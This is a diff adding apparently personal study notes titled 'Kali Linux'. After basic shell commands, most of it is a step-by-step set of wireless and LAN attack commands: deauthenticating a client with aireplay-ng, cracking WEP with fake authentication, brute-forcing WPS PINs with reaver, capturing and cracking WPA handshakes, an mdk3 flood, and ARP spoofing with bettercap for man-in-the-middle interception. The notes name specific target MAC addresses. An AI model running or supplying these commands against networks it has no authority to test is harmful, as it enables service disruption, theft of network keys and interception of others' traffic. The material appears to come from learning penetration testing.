@@ -1,0 +1,74 @@
+Kali Linux
+
+* pwd - command displays current working directory
+* ls - get all directories
+* cd Download - changing the directory 
+* cd .. - back directory
+* man (ls) - provide the manual how to use that command. Use 'q' to come out from it.
+* ls -l display more information of directory.
+* apt-get - It allows us to search, install, manage, update and remove software.
+* ifconfig - lists all the interfaces
+* iwconfig - lists only wireless interfaces.
+* ifconfig wlan0(network interface) down - it stops the corresponding network interface.
+* iwconfig wlan0 mode monitor -  enables monitor mode
+If above commands not works, use
+* airmon-ng start wlan0 - this enables monitor mode.
+* ctrl+c - to quit any command from terminal
+* airodump-ng wlan0 - discover all wireless connections nearby.
+If essid not showing, reconnect the adapter.
+* airodump-ng --bssid 74:DA:88:38:68:8E --channel 10 --write test(filename) wlan0 -  this sniff particular device
+* wireshark is used to analyze packets that return by above commands.
+* aireplay-ng --deauth 100000000 -a 74:DA:88:38:68:8E -c 58:85:E9:38:5A:69 wlan0 - this stops specific client to access internet  
+
+* WEP Cracking
+  To crack wep we need to 
+ - Capture a large number of packets/IVs using airodump-ng (wireshark se upper wali command)
+ - Analyse the captured IVs and crack the key using aircrack-ng. aircrack-ng filename.cap
+ - If we are not getting enough data, we can use fake authentication by associate with the AP before launching the attack.
+   aireplay-ng --fakeauth 0 -a 1C:18:4A:5B:D9:40 -h 22:C7:0F:EA:A5:07 wlan0
+   aireplay-ng --fakeauth 30 -a 74:DA:88:38:68:8E -h 4A:C2:58:18:5D:B5 wlan0
+
+
+* WPA/WPA2 Cracking
+  ARP Request Replay
+ - WPS is a feature that can be used with WPA & WPA2.
+ - Allows clients to connect without the password.
+ - Authentication is done by 8 digit pin.
+ - This only works if the router is configured not to use PBC(Push button Authentication).
+ wash --interface wlan0  or airodump-ng --wps wlan0
+ wash - display all the n/ws around us that have WPS enabled.
+Reaver is a program that going to bootforce the pin, try every possible pin, it'll use it to compute the actual WPA Key.
+reaver --bssid 74:DA:88:38:68:8E --channel 11 --interface wlan0 -vvv --no-associate
+mdk3 wlan0 a -a 20:E2:17:08:19:2C -m
+
+
+2 things needed to crack wpa/wpa2:
+- 4-way handshake (we deauth or wait for new device to connect with router and in same time we can get handshake)
+- wordlist (crunch min max character -o filename -t pattern)
+aircrack-ng wpa_handshake-01.cap -w password.txt
+
+* Netdiscover
+  netdiscover -c 10 -r 192.168.2.110/24 -i wlan0 (netdiscover -c <noOfPackets> -r <range> -i <interfaceName>)
+
+* Network Mapping (Nmap/zenmap)
+ - Huge security scanner.
+ - From an IP/IP range it can discover:
+   Open Ports
+   Running services
+   Operating System
+   Connected Clients and more.
+ 
+* Man In the middle attack
+ ARP (Address Resolution Protocol) - simple protocol used to map IP address of a machine to its mac address.
+ - ARP Spoofing - In this, hacker get the request from victim and send it to access point and similarly get the response from access point and transfer it to victim so that hacker know all the information as it is in middle of the communication. 
+  Bettercap - bettercap -iface wlan0
+	      net.probe on
+	      net.show
+              set arp.spoof.fullduplex true
+              set arp.spoof target targetIp
+              arp.spoof on
+
+
+-Resources
+1. explainshell.com
+2. Packet sniffing (Airodump-ng) used to capture packets withing range while we are in monitor mode.
